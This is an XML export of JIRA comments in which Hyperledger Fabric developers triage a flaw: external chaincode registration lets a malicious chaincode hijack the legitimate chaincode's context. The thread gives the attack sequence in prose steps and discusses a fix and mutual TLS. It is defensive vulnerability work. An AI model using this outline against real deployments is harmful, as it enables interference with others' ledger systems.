<Action id="26683" issue="18038" author="yacovm" type="comment" created="2017-06-18 06:12:05.0" updateauthor="yacovm" updated="2017-06-18 06:12:05.0"> <body><! CDATA {quote}Kicking out the external chaincode when not in devmode and not allowing it to REGISTER ... this doesn't make the TLS connection more secure - so we still do need to consider this JIRA - but makes it more difficult to exploit than Yacov Manevich did. {quote} What do you mean by *makes it more difficult to exploit than Yacov did* ?  It is not hard to sneak into the time window because when you attempt to do so, you can simply iterate in small increments of time (i.e 1 ms, 2ms, ... ) until you're in. The fact that your register your chaincode shim *before* the invoke promises you the real container would never block you - meaning, you have an infinite amount of attempts you can do, and you don't need that many.  ></body> </Action>
<Action id="26684" issue="18038" author="muralisr" type="comment" created="2017-06-18 08:15:44.0" updateauthor="muralisr" updated="2017-06-18 08:16:24.0"> <body><! CDATA  ~yacovm  The fundamental issue is that we don't kick out an externally launched chaincod but allow it to register. I believe your test made use if this by registering a chaincode and when it didn't get kicked out, had to just stay there for the "good" chaincode to be launched so it can take the context. This is not much of a race and easily exploited.  The sequence of events # launch the external CC registers and wait (it should have been kicked out but was not) # at some point the good chaincode gets launched by the peer in response to an invoke # the peer thinks the registration from the waiting bad stream is the right one and starts using it # the good chaincode tries to register but fails  If the bad chaincode gets kicked out, clearly step 1 above won't work. To exploit the window is much harder # somehow know when a chaincode is about to be launched (or keep trying registration of the external chaincode in a loop) # the good chaincode gets launched by the peer  # the bad chaincode comes in and registers before the good chaincode can # the good chaincode attempts to register but fails  The second case is race in the true sense of the word.    Bottom line - regardless of what we do with TLS, we should kick the bad external chaincode out when not in dev mode. I have put this out in a WIP CR https://gerrit.hyperledger.org/r/#/c/10747/ so we can reason and even just test it out.  This fix is necessary from chaincode functionality point of view (we should kick out external chaincodes unless in dev mode). The TLS approach is necessary from a security point of view.   (Now I have to sleep .. :-) )    ></body> </Action>
<Action id="26696" issue="18038" author="muralisr" type="comment" body="The https://gerrit.hyperledger.org/r/#/c/10747 is ready. I left in the WIP so it doesn&apos;t get merged accidently till we are clear on the direction for this JIRA." created="2017-06-18 15:26:17.0" updateauthor="muralisr" updated="2017-06-18 15:26:17.0"/>
<Action id="26874" issue="18038" author="binhn" type="comment" body="Since we have addressed the critical part of this defect, I am creating a related defect to capture the remaining task (mutual TLS) from here as improvement for future release FAB-4894." created="2017-06-20 18:30:14.0" updateauthor="binhn" updated="2017-06-20 18:43:50.0"/>
